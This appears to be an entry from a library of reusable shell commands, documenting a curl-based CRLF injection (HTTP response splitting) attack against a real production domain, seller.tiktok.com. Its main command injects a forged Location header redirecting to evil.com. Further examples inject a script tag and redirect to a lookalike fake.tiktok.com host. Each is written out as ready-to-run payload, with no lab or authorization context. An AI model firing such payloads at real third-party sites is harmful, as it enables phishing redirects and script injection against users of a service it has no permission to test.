---
data: >-
  curl -X GET
  "https://seller.tiktok.com/endpoint?hack_redirect_now=%0D%0ALocation:%20https://evil.com%0D%0A"
  -v
tags:
  - crlf-injection
  - web-exploit
  - http-manipulation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:34.730Z'
id: 988ff48c-5a38-4c30-a8e8-a1c093e85a9e
verified: false
validated: true
submitted: true
---
# curl-crlf-injection

## Command

```bash
curl -X GET "https://seller.tiktok.com/endpoint?hack_redirect_now=%0D%0ALocation:%20https://evil.com%0D%0A" -v
```

## Description

This command injects a CRLF payload into the 'hack_redirect_now' parameter to test or exploit HTTP Response Splitting, appending a fake Location header.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `URL with %0D%0A` | Encoded CRLF payload | Yes |
| `-v` | Verbose for header inspection | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://seller.tiktok.com/endpoint?hack_redirect_now=%0D%0A%0D%0A<script>alert(1)</script>" -v
```

### Advanced Usage

```bash
curl -X GET "https://seller.tiktok.com/endpoint?hack_redirect_now=%0D%0ALocation:%20https://fake.tiktok.com%0D%0A" -v -L
```

## Expected Output

Response with injected headers visible in verbose output, such as duplicate or custom headers indicating successful splitting.

## Related

- [[commands/curl-basic-test]]
